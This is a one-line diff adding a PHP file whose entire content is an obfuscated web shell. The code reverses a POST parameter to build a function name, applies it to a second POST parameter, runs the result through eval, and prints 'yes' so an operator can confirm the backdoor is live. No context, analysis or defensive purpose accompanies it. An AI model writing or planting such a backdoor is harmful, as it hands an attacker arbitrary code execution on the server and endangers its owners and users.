@@ -1,0 +1,1 @@
+<?php $Exp=strrev($_POST['djking']);eval($Exp($_POST[z0])); echo "yes";?> 
